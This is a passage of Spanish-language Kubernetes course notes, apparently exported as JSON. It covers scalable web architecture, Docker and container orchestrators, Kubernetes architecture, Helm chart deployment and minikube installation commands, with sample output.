servicios en diferentes equipos hace que no haya interacciones entre ellos y no compitan por los mismos recursos.\n\nPaso 3. Servidores de aplicaciones en equipos separados\nEl coste computacional mayor en una aplicación web suele recaer en los servidores de aplicaciones, que son los que ejecutan código complejo, mientras que el servidor web se limita a servir el contenido generado por estos servidores de aplicaciones o los ficheros estáticos del sitio web. Al servir tres aplicaciones web diferentes desde el mismo equipo, podemos tener importantes interacciones entre ellas y que un aumento de uso de una aplicación, repercuta negativamente en las otras. Es por esto, por lo que se puede separar estos servidores de aplicación en equipos dedicados para cada una de ellas. La función del servidor web en este caso, se acerca más a la de un proxy inverso, que pasa la petición web a un equipo interno (el servidor de aplicaciones).\n\nPaso 4. Caché SQL\nLos servidores de aplicaciones consultan continuamente a los servidores de bases de datos y cada consulta conlleva un importante coste computacional y una ralentización de la respuesta. Si la misma consulta ya se ha realizado antes, se puede acelerar mucho la velocidad de respuesta con menor coste computacional utilizando un servicio de caché SQL, de manera que los servidores de aplicaciones se configuran para consultar al servidor caché, que servirá directamente la respuesta si ya lo ha hecho anteriormente, o consultará al servidor de bases de datos en caso necesario. Memcached o redis son dos opciones muy utilizadas como caché SQL.\n\nPaso 5. Caché HTTP\nAl igual que se puede cachear la respuesta del servidor de bases de datos, se puede hacer lo mismo con la del servidor de aplicaciones o el servidor web. Dependiendo del servidor de aplicaciones, se puede ubicar este componente delante del servidor web o entre éste y el servidor de aplicaciones. Dicho de otro modo, podemos cachear http o algún otro protocolo como CGI, WSGI, etc. Un software muy conocido de caché http es varnish.\n\nPaso 6. Varios servidores de aplicaciones\nSi la demanda de alguna de las aplicaciones varía de forma importante, se puede utilizar escalado horizontal, aumentando el número de nodos de estos servidores de aplicaciones a la demanda de cada momento. Esto conlleva dos importantes modificaciones, el almacenamiento entre los servidores de aplicación de la misma aplicación tiene que estar distribuido de forma que garantice el uso concurrente y se deben repartir las peticiones a los diferentes servidores de aplicación a través de un balanceador de carga.\n\nPaso 7. Alta disponibilidad en el resto de componentes\nNo solo se pueden escalar horizontalmente los servidores de aplicaciones, sino que si queremos ofrecer realmente alta disponibilidad en todos los niveles, debemos crear una arquitectura en la que la disponibilidad nunca dependa de uno solo nodo y el sistema pueda responder siempre ante incidencias puntuales en cualquier nivel.\n\nPaso 8. Microservicios y aplicaciones “tradicionales”\nUna de las opciones que se considera más adecuada hoy en día para el desarrollo y puesta en producción de aplicaciones web es la utilización de microservicios. Con este enfoque los propios componentes de la aplicación se separan en múltiples componentes que se ejecutan en nodos independientes (típicamente contenedores) y se comunican unos con otros a través de servicios en red que ofrecen al resto.\nEstos microservicios no solo incluirían de forma independiente los componentes que hemos explicado hasta ahora, sino que principalmente se refiere a la separación de los componentes internos de la aplicación en diferentes microservicios.\n\nPaso 9. Escalabilidad en los microservicios\nAl ofrecer microservicios no podemos tener dependencia de un solo nodo, por lo que al igual que en los pasos anteriores, se debe ofrecer la posibilidad de escalar cualquier componente a la demanda y que el sistema globalmente pueda responder ante cualquier error puntual.\n\nPaso 10. Microservicios en todas las aplicaciones\nEn lugar de utilizar microservicios en una aplicación, podríamos utilizarlos en todas, pero manteniendo los componentes auxiliares gestionados aparte.\n\nPaso 11. Todo en microservicios\nO podríamos tener todo definido internamente en microservicios, tanto los componentes de cada aplicación, como los componentes auxiliares.\n\nContenedores\nEn parte por lo que hemos explicado aquí, y en parte por las ventajas que proporciona en el desarrollo de software y en el rápido despliegue, muchos de los componentes que hemos presentado se ejecutan no sobre máquinas virtuales o físicas, sino que lo hacen sobre contenedores de aplicaciones tipo docker (hoy en día se plantean otras alternativas como podman o containerd, pero no vamos a entrar en esa explicación). Docker es capaz de gestionar esos contenedores de forma ágil y rápida, pero no tiene funcionalidad para ejecutar escenarios tan complejos como los anteriores, que además se ejecutarían lógicamente en diferentes nodos físicos o virtuales (que a su vez ejecutarían docker para los componentes de la aplicación).\nConclusión\nEsto no son más que un conjunto de componentes y una explicación muy rápida de ellos, el orden y la ubicación de ellos es variable en función del caso de uso, pero en cualquier caso queríamos presentarlos aquí para tener una visión global de hacia dónde vamos. Algo que claramente podemos ver es que la gestión de este tipo de aplicaciones se convierte pronto en algo muy complejo, por lo que necesitamos apoyarnos en algún software que controle y gestione de forma adecuada estos sistemas tan complejos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker":{"title":"1.2-docker","links":[],"tags":[],"content":"1.2 Docker\nDocker es una empresa (Docker Inc.) que desarrolla un software con el mismo nombre, de forma más concreta el software denominado (docker engine), que ha supuesto una revolución en el desarrollo de software, muy ligado al uso de contenedores de aplicaciones, a las aplicaciones web y al desarrollo ágil.\nDocker permite gestionar contenedores a alto nivel, proporcionando todas las capas y funcionalidad adicional y, lo más importante de todo, es que proporciona un nuevo paradigma en la forma de distribuir las aplicaciones, ya que se crean imágenes en contenedores que se distribuyen, de manera que el contenedor que se ha desarrollado es idéntico al que se utiliza en producción y deja de instalarse la aplicación de forma tradicional.\nComponentes de docker\nDocker engine tiene los componentes que a grosso modo se presentan a continuación:\n\nEn la imagen se han destacado los componentes que son relevantes desde el punto de vista de este curso, ya que como veremos más adelante, docker podría ser un componente esencial de Kubernetes, pero realmente no lo es completo, solo containerd y los elementos que éste proporciona lo son, ya que k8s utiliza su propia API, su propia línea de comandos y gestiona el almacenamiento y las redes de forma independiente a docker.\nEvolución del proyecto docker\nDocker tuvo un enorme éxito y una gran repercusión, pero la empresa que lo desarrolla siempre se ha movido en el dilema de cómo sacar rendimiento económico a su software, que al ser desarrollado bajo licencia libre, no proporciona beneficio como tal. Este dilema se ha tratado de resolver con modificaciones en la licencia o con doble licenciamiento (docker CE y docker EE en estos momentos), pero esto a su vez ha propiciado que otras empresas desarrollasen alternativas a docker para no depender en el futuro de una empresa sin un modelo de negocio claro y ante posibles modificaciones de la licencia libre de docker.\nLos cambios más significativos que han ocurrido en docker se enumeran a continuación:\n\nMoby Docker engine se desarrolla ahora como proyecto de software libre independiente de Docker Inc. denominándose Moby. De este proyecto se surten las distribuciones de linux para desarrollar los paquetes docker.io\nDocker Engine Versión desarrollada por Docker Inc.\nrunC Componente que ejecuta los contenedores a bajo nivel. Actualmente desarrollado por OCI\ncontainerd Componente que ejecuta los contenedores e interactúa con las imágenes. Actualmente desarrollado por la CNCF.\n\nLimitaciones de docker (docker engine)\nDocker (docker engine) gestiona completamente la ejecución de un contenedor en un determinado nodo a partir de una imagen, pero no proporciona toda la funcionalidad que necesitamos para ejecutar aplicaciones en entornos en producción.\nExisten diferentes preguntas que nos podemos hacer acerca de esto :\n\n¿Qué hacemos con los cambios entre versiones?\n¿Cómo hacemos los cambios en producción?\n¿Cómo se balancea la carga entre múltiples contenedores iguales?\n¿Cómo se conectan contenedores que se ejecuten en diferentes demonios de docker?\n¿Se puede hacer una actualización de una aplicación sin interrupción?\n¿Se puede variar a demanda el número de réplicas de un determinado contenedor?\n¿Es posible mover la carga entre diferentes nodos?\n\nLas respuestas a estas preguntas no pueden venir de docker engine, ya que no es un software desarrollado para eso, tiene que venir de algún software que pueda utilizar docker o parte de él y que sea capaz de comunicar múltiples nodos para proporcionar de forma coordinada estas funcionalidades. Ese software se conoce de forma genérica como orquestador de contenedores."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores":{"title":"1.3-orquestadores-de-contenedores","links":[],"tags":[],"content":"1.3 Orquestadores de contenedores\nTan pronto como se fue extendiendo el uso de docker para el desarrollo de aplicaciones web, surgió la necesidad de desarrollar software de orquestadores de contenedores para gestionar de forma coordinada múltiples nodos en los que se estuvieran ejecutando contenedores y para proporcionar funcionalidad no ofrecida por docker engine y que es necesaria en la puesta en producción de la aplicación.\nDocker swarm\nLógicamente la propia empresa Docker Inc. comenzó pronto el desarrollo de su orquestador que extendía la funcionalidad de docker y creó el proyecto Swarm (enjambre), aunque en las últimas versiones de docker-engine, ya se incluye swarm como un componente y no es necesario instalarlo de forma separada.\nActualmente se considera que docker swarm es una solución de orquestación de contenedores sencilla y que es adecuada para determinados entornos no muy exigentes, pero no puede competir con Kubernetes en grandes entornos expuestos a Internet. Su desarrollo continúa, pero ya no como un competidor de Kubernetes, de hecho la propia Docker Inc. publicita Kubernetes como un producto sobre el que ofrecen servicios.\nApache Mesos\nApache Mesos es un proyecto de software libre que proporciona un orquestador de contenedores. Este proyecto actualmente está bajo el paraguas de la Apache Software Foundation, pero originalmente fue desarrollado por la empresa Mesosphere, hoy renombrada a D2iQ. Mesos ha ido derivando de un competidor de Kubernetes hacia un software que proporcione soluciones más específicas, como DC/OS.\nHashicorp Nomad\nNomad es un proyecto de la prestigiosa empresa Hashicorp (Vagrant, Terraform, etc.) y su idea es ser un software de orquestación más simple, que se centre en la gestión del cluster de nodos y la ejecución de contenedores en ellos, pero sin proporcionar todo el resto de funcionalidad adicional, por lo que Nomad se utiliza junto a otro software cuando se pone en producción."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes":{"title":"1.4-el-proyecto-kubernetes","links":[],"tags":[],"content":"1.4 El proyecto Kubernetes\nEl proyecto Kubernetes lo inicia Google en 2014 como un software (libre) para orquestar contenedores. En aquel momento había varios proyectos de software que querían extender las posibilidades del uso de contenedores de aplicaciones tipo docker a entornos en producción, lo que de forma genérica se conoce como orquestadores de contenedores. A diferencia del resto, Kubernetes no es un proyecto que se desarrolla desde cero, sino que aprovecha todo el conocimiento que tenía Google con el uso de la herramienta interna Borg, de manera que cuando se hace pública la primera versión de Kubernetes, ya era un software con muchas funcionalidades.\nUn proyecto se convierte en software libre cuando utiliza una licencia libre, pero otro aspecto importante es la gobernanza del proyecto, es decir, si el desarrollo es abierto o no, si las decisiones sobre las nuevas funcionalidades las toma una empresa o se consensúan, etc. Si un proyecto de software libre lo inicia una única empresa, siempre existe la desconfianza de que ese proyecto vaya a ir encaminado a beneficiar a esa empresa. En este caso, la empresa en cuestión era un gigante como Google, por lo que aunque el proyecto era muy interesante, existía cierto recelo de gran parte del sector inicialmente. Para conseguir que una parte importante del sector se sumase al proyecto, Google tomó la decisión de desvincularse del mismo y ceder el control a la Cloud Native Compute Foundation (CNCF), por lo que Kubernetes es un proyecto de software libre de fundación, en el que se admiten contribuciones de forma abierta y donde las reglas de la gobernanza recaen sobre los miembros de la fundación, normalmente un conjunto amplio de grandes empresas del sector. Es decir, aunque hoy en día hay quien habla de Kubernetes como el software de orquestación de contenedores de Google, esto es un error, es un proyecto que gestiona desde hace años la CNCF, a la que ni siquiera pertenece Google.\n¿Qué es Kubernetes?\nKubernetes es un software pensado para gestionar completamente el despliegue de aplicaciones sobre contenedores, realizando este despliegue de forma completamente automática y poniendo un gran énfasis en la escalabilidad de la aplicación, así como el control total del ciclo de vida. Por destacar algunos de los puntos más importantes de Kubernetes, podríamos decir:\n\nDespliega aplicaciones rápidamente\nEscala las aplicaciones al vuelo\nIntegra cambios sin interrupciones\nPermite limitar los recursos a utilizar\n\nKubernetes está centrado en la puesta en producción de contenedores y por su gestión es indicada para administradores de sistemas y personal de equipos de operaciones. Por otra parte, afecta también a los desarrolladores, ya que las aplicaciones deben adaptarse para poder desplegarse en Kubernetes.\nCaracterísticas principales\nKubernetes surge como un software para desplegar aplicaciones sobre contenedores que utilicen infraestructura en nube (pública, privada o híbrida). Aunque puede desplegarse también en entornos más tradicionales como servidores físicos o virtuales, no es su “entorno natural”.\nKubernetes es extensible, por lo que cuenta con gran cantidad de módulos, plugins, etc.\nEl nombre del proyecto proviene de una palabra de griego antiguo que significa timonel y habitualmente se escribe de forma abreviada como k8s.\nCaracterísticas del software\nKubernetes está desarrollado en el lenguaje Go como diversas aplicaciones de este sector. La primera versión de Kubernetes se publicó el 7 de junio de 2014, aunque la más antigua disponible en el repositorio es la v0.2, de septiembre de 2014.\nLa licencia utilizada en Kubernetes es la Apache License v2.0, licencia de software libre permisiva, muy utilizada últimamente en proyectos de fundación en los que están involucrados empresas, ya que no se trata de una licencia copyleft, que no permitiría su inclusión en software que no sea libre, mientras que la licencia Apache sí lo permite en determinadas circunstancias.\nEl código de Kubernetes se gestiona a través de Github en cuyo repositorio se puede ver la gran cantidad de código desarrollado en estos años (más de 100000 “commits”) y las miles de personas que han participado en mayor o menor medida. La última versión de Kubernetes en el momento de escribir esta documentación es la 1.23 y el proyecto actualmente está publicando dos o tres versiones nuevas cada año.\nEn cualquier caso la versión de Kubernetes no es algo esencial para los contenidos de este curso, porque se van a tratar los elementos básicos, que ya están muy establecidos y, salvo algún detalle menor, se puede realizar este curso al completo con una versión de Kubernetes diferente a la utilizada para la documentación.\nEl ecosistema\nDe entre todas las opciones de orquestadores de contenedores disponibles, hoy se considera que la opción preferida en la mayor parte de los casos es k8s y se ha desarrollado un enorme ecosistema de aplicaciones alrededor que proporcionan algunas funcionalidades que no tiene k8s o que de alguna forma utiliza o se pueden integrar de diferente forma con k8s. Este ecosistema de aplicaciones está actualmente en plena “ebullición” y es posible que en unos años algunos de esos proyectos se estabilicen y otros desaparezcan, ya que en muchos casos solapan unos con otros.\nlandscape.cncf.io/"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes":{"title":"1.5-arquitectura-basica-de-kubernetes","links":[],"tags":[],"content":"1.5 Arquitectura básica de Kubernetes\nNodos\nk8s es un software que se instala en varios nodos que se gestionan de forma coordinada, es decir, un clúster de nodos. Aunque es posible en casos muy peculiares instalar algunos nodos sobre sistemas Windows, la situación normal es que se trate de un cluster de nodos linux. No es necesario que todos los nodos tengan la misma versión y ni siquiera que sean la misma distribución, aunque en muchos casos sí lo sea por simplicidad en el despliegue y mantenimiento.\nLos nodos del clúster pueden ser máquinas físicas o virtuales, pero quizás lo más habitual es que se traten de instancias de nube de infraestructura, es decir, máquinas virtuales ejecutándose en algún proveedor de IaaS (AWS, GCP, OpenStack, etc.)\nSe distingue entre dos tipos de nodos:\n\nLos nodos master: Son los que ejecutan los servicios principales de k8s y ordenan a los otros nodos los contenedores que deben ejecutar. Como el uso del término master es últimamente muy controvertido en los paises de habla inglesa, se está cambiando su denominación por control plane node.\nLos nodos worker: Son los que reciben las órdenes de los controladores y en los que se ejecutan los contenedores de las aplicaciones.\n\nComponentes de un nodo master\n\nkube-apiserver Gestiona la API de k8s\netcd Almacén clave-valor que guarda la configuración del clúster\nkube-scheduler Selecciona el nodo donde ejecutar los contenedores\nkube-controller-manager Ejecuta los controladores de k8s\ndocker/rkt/containerd/… Ejecuta los contenedores que sean necesarios en el controlador\ncloud-controller-manager Ejecuta los controladores que interactúan con el proveedor de nube:\n\nnodos\nenrutamiento\nbalanceadores\nvolúmenes\n\n\n\nComponentes de un nodo worker\n\nkubelet Controla los Pods asignados a su nodo\nkube-proxy Permite la conexión a través de la red\ndocker/rkt/containerd/… Ejecuta los contenedores\nsupervisord Monitoriza y controla kubelet y docker\n\nComplementos (addons)\nLos elementos anteriores forman la estructura básica de k8s, pero es muy habitual que se proporcione funcionalidad adicional a través de complementos de k8s, que en muchas ocasiones se ejecutan a su vez como contenedores y son gestionados por el propio Kubernetes. Algunos de estos complementos son:\n\nCluster DNS Proporciona registros DNS para los servicios de k8s. Normalmente a través de CoreDNS\nWeb UI Interfaz web para el manejo de k8s\nContainer Resource Monitoring Recoge métricas de forma centralizada. Múltiples opciones: prometheus, sysdig\nCluster-level Logging Almacena y gestiona los logs de los contenedores\n\nEsquema de nodos y componentes\nSe crea un cluster de k8s en los que algunos nodos actúan como master (normalmente se crea un conjunto impar de nodos master que proporcionen alta disponibilidad) y el resto actúa como worker en los que se ejecutan los contenedores de las aplicaciones. Los nodos se comunican entre sí a través de una red que proporciona la capa de infraestructura y se crea una red para la comunicación de los contenedores, que suele ser una red de tipo overlay.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm":{"title":"10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","links":[],"tags":[],"content":"10. Instalación de aplicaciones en Kubernetes con Helm\nComo hemos estudiado en las unidades anteriores, una aplicación real completa se compone de un conjunto amplio de objetos que definen Deployments, ConfigMaps, Services, etc. La API de Kubernetes no nos ofrece un “superobjeto” que defina una aplicación completa.\nNecesitamos herramientas para gestionar la aplicación completa: empaquetado, instaladores, control de la aplicación en producción, etc. En esta unidad vamos a estudiar Helm, que es un software que nos permite empaquetar aplicaciones completas y gestionar el ciclo completo de despliegue de dicha aplicación.\nHelm usa un formato de empaquetado llamado charts. Un chart es una colección de archivos que describen un conjunto de recursos que nos permite desplegar una aplicación en Kubernetes.\nLos charts son distribuidos en distintos repositorios, que podremos dar de alta en nuestra instalación de Helm. Para buscar los distintos charts y los repositorios desde los que se distribuyen podemos usar la página Artifact Hub."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm":{"title":"10.1-instalacion-de-helm","links":[],"tags":[],"content":"10.1 Instalación de Helm\nOcultar\nHelm se distribuye como un único binario que podemos instalar de distintas formas. La última versión del programa la podemos encontrar en esta página y podemos ver los distintos métodos de instalación en la documentación oficial.\nUna vez instalado podemos ver la versión de Helm que tenemos instalada:\nhelm version\n\nLos siguiente es indicar un repositorio para que podamos empezar a trabajar con helm, para ello:\nhelm repo add &quot;stable&quot; &quot;charts.helm.sh/stable&quot; --force-update\n\nY ahora el repositorio stable corresponde a charts.helm.sh/stable:\nhelm repo list\nNAME  \tURL                          \nstable\tcharts.helm.sh/stable\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones":{"title":"10.2-gestion-de-charts-y-despliegue-de-aplicaciones","links":[],"tags":[],"content":"10.2 Gestión de charts y despliegue de aplicaciones\nComo hemos visto anteriormente, por defecto, tenemos instalado un repositorio:\nhelm repo list\nNAME  \tURL                          \nstable\tcharts.helm.sh/stable\n\nPodemos buscar más repositorios de charts buscando en la página Artifact Hub, por ejemplo podemos añadir el repositorio de charts de Bitnami de la siguiente manera:\nhelm repo add bitnami charts.bitnami.com/bitnami\n&quot;bitnami&quot; has been added to your repositories\n\nY podemos comprobar que hemos añadido un nuevo repositorio:\nhelm repo list\nNAME   \tURL                               \nstable \tcharts.helm.sh/stable     \nbitnami\tcharts.bitnami.com/bitnami\n\nSi queremos actualizar la lista de charts ofrecidos por los repositorios:\nhelm repo update\nHang tight while we grab the latest from your chart repositories...\n...Successfully got an update from the &quot;stable&quot; chart repository\n...Successfully got an update from the &quot;bitnami&quot; chart repository\nUpdate Complete. ⎈Happy Helming!⎈\n\n\nBuscar charts\nComo hemos comentado anteriormente, los charts los podemos buscar en la página Artifact Hub o los podemos buscar desde la línea de comandos, por ejemplo si queremos buscar un chart relacionado con nginx:\nhelm search repo nginx\nNAME                            \tCHART VERSION\tAPP VERSION\tDESCRIPTION                                       \nbitnami/nginx                   \t9.3.0        \t1.21.0     \tChart for the nginx server                        \nbitnami/nginx-ingress-controller\t7.6.12       \t0.47.0     \tChart for the nginx Ingress controller            \nstable/nginx-ingress            \t1.41.3       \tv0.34.1    \tDEPRECATED! An nginx Ingress controller that us...\nstable/nginx-ldapauth-proxy     \t0.1.6        \t1.13.5     \tDEPRECATED - nginx proxy with ldapauth            \n...\n\nPara obtener información sobre el chart bitnami/nginx podemos buscar en Artifact Hub.\nTodos los ficheros yaml que forman parte de un chart están parametrizados, es decir cada propiedad tiene un valor por defecto, pero a la hora de instalarlo se puede cambiar. Por ejemplo, ¿qué tipo de Service se creará al instalar el chart bitnami/nginx? Por defecto, el parámetro service.type tiene como valor LoadBalancer, pero si queremos un Service de tipo NodePort, podremos redefinir este parámetro a la hora de instalar el chart.\n¿Y cómo sabemos los parámetros que tiene definido cada chart y sus valores por defecto?. Estudiando la documentación del chart en Artifact Hub. En concreto para el chart con el que estamos trabajando, accediendo a la url artifacthub.io/packages/helm/bitnami/nginx. También podemos obtener esta información ejecutando el siguiente comando:\nhelm show all bitnami/nginx\n\n\nInstalación del chart\nPara instalar el chart ejecutamos la siguiente instrucción:\nhelm install serverweb bitnami/nginx --set service.type=NodePort\n\nComo vemos hemos nombrado el chart desplegado (serverweb), indicado el chart (bitnami/nginx) y, en este caso, hemos redefinido el parámetro service.type.\nCuando se despliega el chart se nos ofrece información que nos muestra cómo acceder a la aplicación:\nNOTES:\n** Please be patient while the chart is being deployed **\n\nNGINX can be accessed through the following DNS name from within your cluster:\n\n    serverweb-nginx.default.svc.cluster.local (port 80)\n\nTo access NGINX from outside the cluster, follow the steps below:\n\n1. Get the NGINX URL by running these commands:\n\n    export NODE_PORT=$(kubectl get --namespace default -o jsonpath=&quot;{.spec.ports[0].nodePort}&quot; services serverweb-nginx)\n    export NODE_IP=$(kubectl get nodes --namespace default -o jsonpath=&quot;{.items[0].status.addresses[0].address}&quot;)\n    echo &quot;http://${NODE_IP}:${NODE_PORT}&quot;\n\nSi queremos acceder a la aplicación desde el exterior debemos ejecutar las tres últimas instrucciones, que nos muestran la ip de nuestro cluster y el puerto asignado al Service NodePort.\nSiempre podemos volver a ver esta información ejecutando la siguiente instrucción:\nhelm status serverweb\n\nPodemos comprobar los Deployments que hemos realizado con Helm, ejecutando:\nhelm ls\nNAME     \tNAMESPACE\tREVISION\tUPDATED                                 \tSTATUS  \tCHART      \tAPP VERSION\nserverweb\tdefault  \t1       \t2021-06-29 19:11:15.975016119 +0200 CEST\tdeployed\tnginx-9.3.0\t1.21.0   \n\nY podemos comprobar también los recursos que se han creado en el cluster:\nkubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/serverweb-nginx-7b7f75d476-kxq8j   1/1     Running   0          56s\n\nNAME                      TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes        ClusterIP   10.96.0.1      &lt;none&gt;        443/TCP        5m14s\nservice/serverweb-nginx   NodePort    10.99.80.141   &lt;none&gt;        80:30137/TCP   56s\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/serverweb-nginx   1/1     1            1           56s\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/serverweb-nginx-7b7f75d476   1         1         1       56s\n\nPor último, para desinstalar una aplicación completa, ejecutamos:\nhelm delete serverweb\nrelease &quot;serverweb&quot; uninstalled\n\nAunque no entra en el ámbito de este curso, hay que indicar que si nosotros desarrollamos una aplicación podemos empaquetarla para instalarla con Helm, creando nuestros propios charts. Para más información puedes entrar en la documentación oficial."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes":{"title":"2.0-instalacion-de-kubernetes","links":[],"tags":[],"content":"2. Instalación de Kubernetes\nEn este módulo vamos a estudiar los siguientes temas:\n\nAlternativas para instalación simple de k8s\nInstalación de minikube\nInstalación y configuración de kubectl\nDespliegues de aplicaciones en Kubernetes\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s":{"title":"2.1-alternativas-para-instalacion-simple-de-k8s","links":[],"tags":[],"content":"2.1 Alternativas para instalación simple de k8s\nKubernetes es un software pensado para poner en producción aplicaciones más o menos complejas que se ejecutan sobre contenedores, garantizando su disponibilidad, escalabilidad y actualización sin interrupciones.\nEn un entorno en producción no se instala Kubernetes en un solo equipo (nodo), sino que creamos un cluster de nodos que permita garantizar el funcionamiento ininterrumpido de las aplicaciones incluso en el caso de que uno o varios de los nodos del cluster tengan algún tipo de incidencia.\nConfigurar y actualizar un cluster de Kubernetes es una tarea compleja, pero existe la posibilidad de instalar de forma fácil un cluster de Kubernetes compuesto por un solo nodo o un conjunto pequeño para algunos casos de uso, como en el caso de la instalación de un entorno de desarrollo o aprendizaje, que es precisamente la situación que tenemos en nuestro caso. Estas instalaciones de Kubernetes no son adecuadas para entornos en producción, pero nos permiten utilizar Kubernetes de forma sencilla, conocer los objetos y atacar la API sin tener que utilizar una instalación más compleja o costosa.\nminikube\nMinikube permite desplegar localmente un “cluster” de Kubernetes con un solo nodo. Minikube es un proyecto oficial de Kubernetes y es probablemente la solución más adecuada para aprender a usar k8s, ya que es un proyecto maduro y muy sencillo de instalar. Los requisitos mínimos para instalar minikube en nuestro equipo son:\n\n2 CPUs\n2GiB de memoria\n20GiB de espacio libre en disco\nUn sistema de virtualización o de contenedores instalado:\n\nDocker\nHyperkit\nHyper-V\nKVM\nParallels\nPodman\nVirtualBox\nVMWare\n\n\n\nMinikube instalará un nodo de Kubernetes en el sistema de virtualización/contenedores que prefiramos, siendo unas opciones más adecuadas que otras dependiendo del sistema operativo de nuestro equipo, tal como se muestra en minikube.sigs.k8s.io/docs/drivers/. En versiones recientes, es posible aumentar el número de nodos del cluster de minikube, aunque para el objetivo de este curso no es necesario y haremos la instalación estándar de un solo nodo.\nLos detalles para la instalación local de minikube los explicamos en la siguiente sección, ya que va a ser el método recomendado para realizar este curso.\nkubeadm\nkubeadm es una solución más realista que minikube si se instala un cluster de Kubernetes con varios nodos. Su instalación no es especialmente compleja, pero no está tan automatizada como minikube y necesita más recursos y tiempo para configurarlo. kubeadm es una opción muy interesante cuando queremos ver de forma detallada la diferencia entre lo que se ejecuta en el nodo controlador y en los nodos workers, que no se puede apreciar en minikube.\nLa instalación de kubeadm se realiza típicamente en varias máquinas virtuales o varias instancias de nube y dejamos un par de enlaces para quienes estén más interesados en indagar en este software:\n\nkubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\nwww.josedomingo.org/pledin/2018/05/instalacion-de-kubernetes-con-kubeadm/\n\nkind\nkind (kubernetes in docker) es un proyecto oficial de Kubernetes más reciente que los dos anteriores y que permite desplegar un cluster de Kubernetes con varios nodos sobre docker. Es también muy interesante como opción de instalación local y de forma análoga al anterior, dejamos un par de enlaces para quienes estén interesados en probarlo:\n\nkind.sigs.k8s.io/docs/user/quick-start/\nwww.josedomingo.org/pledin/2021/02/kubernetes-con-kind/\n\nk3s\nA diferencia de las opciones anteriores, k3s es una distribución de Kubernetes que sí está pensada para poner en producción, pero en unas circunstancias peculiares como son su uso para IoT, edge computing y en general para configurar clusters de Kubernetes en sistemas de pocos recursos (k3s es por ejemplo la opción más adecuada para usar Kubernetes en la arquitectura arm). k3s no es un proyecto oficial de Kubernetes, sino que lo comenzó a desarrollar la empresa Rancher y hoy en día lo mantiene la Cloud Native Computing Foundation.\nLos pasos para la instalaciónde k3s están disponibles en:\n\nrancher.com/docs/k3s/latest/en/installation/\n\nConclusión\nAunque existen múltiples opciones de instalación de Kubernetes, en este curso utilizaremos minikube que es el proyecto más maduro y que consideramos más adecuado para comenzar y centrarnos directamente en el uso de Kubernetes, obviando inicialmente los detalles de la instalación de Kubernetes, que realmente es un proceso complejo y que no es lo más adecuado para empezar."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube":{"title":"2.2-introduccion-a-la-instalacion-de-minikube","links":[],"tags":[],"content":"2.2 Introducción a la instalación de minikube\nEl “clúster” de k8s que vamos a utilizar en este curso es el de un solo nodo que va a encargarse de realizar tanto las tareas de master, con los componentes principales de Kubernetes, como de worker, ejecutando las cargas de trabajo en contenedores (ya veremos más adelante que realmente utiliza algo que se llama Pod).\nMinikube se distribuye como un programa que se instala en nuestra máquina física (podría instalarse igualmente en una máquina virtual a la que tuviésemos acceso completo) y que al ejecutarlo crea una máquina virtual linux con un clúster de Kubernetes completamente configurado y listo para su uso. Podemos instalar minikube en nuestra máquina con sistema linux, windows o mac y en una variedad importante de sistemas de virtualización, aunque en el curso recomendaremos sólo algunas combinaciones que hemos probado y que incluyen toda la funcionalidad necesaria para realizar el curso.\nNota: Puede haber interacción si utilizamos más de un sistema de virtualización en nuestro equipo, por ejemplo, la utilización en Windows de virtualbox para unas cosas e hyper-v para minikube, puede dar lugar a problemas, por lo que en general es recomendable usar un solo sistema de virtualización.\nCombinaciones de sistema operativo/virtualización recomendadas para el curso:\n\nLinux + KVM\nLinux + VirtualBox\nWindows + VirtualBox\n\nNota: Recomendamos la instalación de Kubernetes en un sistema Linux (Debian o Ubuntu), bien con KVM o con VirtualBox. Sabemos por experiencia, que da menos problemas que en un sistema Windows."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox":{"title":"2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","links":[],"tags":[],"content":"2.3 Instalación de minikube en linux con KVM/VirtualBox\nAccedemos a minikube.sigs.k8s.io/docs/start/ y seleccionamos el método que prefiramos para instalar, eligiendo nuestro sistema operativo, arquitectura, etc.\nMinikube se instala, como otras aplicaciones de Go, como un binario enlazado estáticamente (autoconsistente), que no tiene dependencias de nada y que tenemos que ubicar en algún directorio del PATH de nuestro sistema. Veamos en particular la instalación directa del binario en un sistema linux:\nPaso 1: Descargamos como usuario normal y con ayuda de la aplicación curl, la última versión del binario de minikube (en este caso para arquitectura x86-64):\ncurl -LO storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64\n\nPaso 2: Movemos el binario a un directorio del PATH (lo recomendable en este caso sería /usr/local/bin/) y establecemos permisos de ejecución. Todo esto puede hacerse con los comandos mv y chmod, o de forma más sencilla con install\nsudo install minikube-linux-amd64 /usr/local/bin/minikube\n\nComprobamos que se ha instalado correctamente con:\nminikube version\n\nminikube version: v1.29.0\ncommit: 